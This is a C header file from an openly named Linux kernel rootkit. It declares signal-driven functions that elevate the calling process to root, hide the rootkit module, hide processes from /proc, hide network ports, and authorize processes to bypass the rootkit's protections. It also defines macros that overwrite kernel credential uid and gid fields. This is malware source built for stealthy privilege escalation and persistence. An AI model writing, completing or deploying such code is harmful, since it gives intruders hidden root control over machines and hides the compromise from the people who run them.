#ifndef _ROOTKIT_SIGNAL_HOOKS_H_
#define _ROOTKIT_SIGNAL_HOOKS_H_

#include "hooking.h"
#include "macro_utils.h"
#include <linux/types.h>

#define P_SIG_HANDLERS p_sig_handlers /* Variable name for the signal handler array */

// Array of the signal handlers.
extern const signal_handler_t P_SIG_HANDLERS[];

/**
 * Sets the value of a `kuid_t` variable.
 *
 * @param _kuid The `kuid_t` variable to change
 * @param _uid  The new value to set
 */
#define __SET_UID(_kuid, _uid) \
    do {                       \
        (_kuid).val = (_uid);  \
    } while (0)

/**
 * Sets the value of a `kgid_t` variable.
 *
 * @param _kgid The `kgid_t` variable to change
 * @param _gid  The new value to set
 */
#define __SET_GID(_kgid, _gid) \
    do {                       \
        (_kgid).val = (_gid);  \
    } while (0)

/**
 * Sets the value of the uid, suid, euid and fsuid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _uid     The new value to set
 */
#define __SET_UIDS(_p_creds, _uid)            \
    do {                                      \
        __SET_UID((_p_creds)->uid, (_uid));   \
        __SET_UID((_p_creds)->suid, (_uid));  \
        __SET_UID((_p_creds)->euid, (_uid));  \
        __SET_UID((_p_creds)->fsuid, (_uid)); \
    } while (0)

/**
 * Sets the value of the gid, sgid, egid and fsgid fields of a `struct cred *` variable.
 *
 * @param _p_creds The `struct cred *` variable to change
 * @param _gid     The new value to set
 */
#define __SET_GIDS(_p_creds, _gid)            \
    do {                                      \
        __SET_GID((_p_creds)->gid, (_gid));   \
        __SET_GID((_p_creds)->sgid, (_gid));  \
        __SET_GID((_p_creds)->egid, (_gid));  \
        __SET_GID((_p_creds)->fsgid, (_gid)); \
    } while (0)

/**
 * Callback for SIGMODSHOW/SIGMODHIDE signal.
 *
 * @param i32_pid The PID that was sent with the signal
 *                (should be equal to PID_SECRET to be allowed to hide the rootkit)
 * @param i32_sig The signal that was passed (SIGMODSHOW/SIGMODHIDE)
 * @return 0 on success, otherwise an error code (should always be 0)
 */
long show_hide_module(const pid_t i32_pid, const int i32_sig);

/**
 * Elevates the current process to root.
 *
 * @param i32_pid The PID that was sent with the signal
 *                (should be equal to PID_SECRET to be allowed to elevate)
 * @param i32_sig The signal that was passed (SIGROOT)
 * @return 0 on success, otherwise an error code
 */
long give_root(const pid_t i32_pid, const int i32_sig);

/**
 * Hides or shows (unhides) the given process from /proc/ and /proc/PID/.
 * If the given PID is 0, the current process is (un)hidden.
 *
 * @param i32_pid The PID to (un)hide
 * @param i32_sig The signal that was passed (SIGHIDE or SIGSHOW)
 * @return 0 on success, otherwise an error code
 */
long show_hide_process(const pid_t i32_pid, const int i32_sig);

/**
 * Authorizes the given process to bypass the rootkit protection mechanisms.
 * If the given PID is 0, the current process is authorized.
 *
 * @param i32_pid The PID to authorize
 * @param i32_sig The signal that was passed (SIGAUTH)
 * @return 0 on success, otherwise an error code
 */
long authorize_process(const pid_t i32_pid, const int i32_sig);

/**
 * Hides or shows the port given as PID.
 *
 * @param i32_pid The port to (un)hide
 * @param i32_sig The signal that was passed (SIGPORTHIDE or SIGPORTSHOW)
 * @return 0 on success, otherwise an error code
 */
long show_hide_port(const pid_t i32_pid, const int i32_sig);

#endif
